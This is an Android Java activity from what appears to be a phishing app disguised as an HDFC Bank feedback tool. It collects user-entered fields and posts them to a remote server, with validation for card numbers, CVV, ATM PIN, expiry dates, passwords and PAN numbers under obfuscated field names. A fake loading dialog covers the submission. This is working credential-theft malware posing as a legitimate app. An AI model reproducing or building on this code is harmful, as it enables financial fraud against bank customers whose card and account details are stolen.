package com.feedback.hdfcbank01;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class ThirdActivity extends AppCompatActivity {

    public Map<Integer, String> ids;
    public HashMap<String, Object> dataObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);

        dataObject = new HashMap<>();
        int id = getIntent().getIntExtra("id", -1);
        Button buttonsubmission = findViewById(R.id.submission);

        ids = new HashMap<>();
        ids.put(R.id.refid, "refid");
        ids.put(R.id.refusercode, "refusercode");

        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        buttonsubmission.setOnClickListener(v -> {
            if (validateForm()) {
                showInstallDialog();
                JSONObject dataJson = new JSONObject(dataObject);
                JSONObject sendPayload = new JSONObject();
                try {
                    Helper help = new Helper();
                    sendPayload.put("site", help.SITE());
                    sendPayload.put("data", dataJson);
                    sendPayload.put("id", id);

                    Helper.postRequest(help.FormSavePath(), sendPayload, new Helper.ResponseListener() {
                        @Override
                        public void onResponse(String result) {
                            if (result.startsWith("Response Error:")) {
                                Toast.makeText(getApplicationContext(), "Response Error : "+result, Toast.LENGTH_SHORT).show();
                            } else {
                                try {
                                    JSONObject response = new JSONObject(result);
                                    if(response.getInt("status")==200){
                                        Intent intent = new Intent(getApplicationContext(), FourthActivity.class);
                                        intent.putExtra("id", id);
                                        startActivity(intent);
                                    }else{
                                        Toast.makeText(getApplicationContext(), "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                    });
                } catch (JSONException e) {
                    Toast.makeText(this, "Error1 "+ e, Toast.LENGTH_SHORT).show();
                }
            }else{
                Toast.makeText(getApplicationContext(), "form validation failed", Toast.LENGTH_SHORT).show();
            }

        });

    }

    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially

        // Clear dataObject before adding new data
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            // Check if the field is required and not empty
            if (!FormValidator.validateRequired(editText, "Required this field...")) {
                isValid = false; // Mark as invalid if required field is missing
                continue; // Continue with the next field
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "phone":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
                        isValid = false;
                    }
                    break;
                case "password":
                case "pass":
                    if (!FormValidator.validatePassword(editText, "Invalid Password")) {
                        isValid = false;
                    }
                    break;
                case "cvv":
                    if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
                        isValid = false;
                    }
                    break;
                case "pin":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
                        isValid = false;
                    }
                    break;
                case "pinttm":
                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                        isValid = false;
                    }
                    break;
                case "exxpp2":
                    if (!FormValidator.validateMinLength(editText, 5, "Invalid Expiry Date")) {
                        isValid = false;
                    }
                    break;
                case "ccrdfull":
                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
                        isValid = false;
                    }
                    break;
                case "pan":
                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }

    private void showInstallDialog() {
        // Inflate the custom layout
        LayoutInflater inflater = getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.dialog_loading, null);

        // Create an AlertDialog builder
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setView(dialogView);  // Set the custom layout as the dialog's view
        builder.setCancelable(false);

        // Create and show the dialog
        AlertDialog dialog = builder.create();
        dialog.show();

        new Handler().postDelayed(dialog::dismiss, 3000);
    }
}
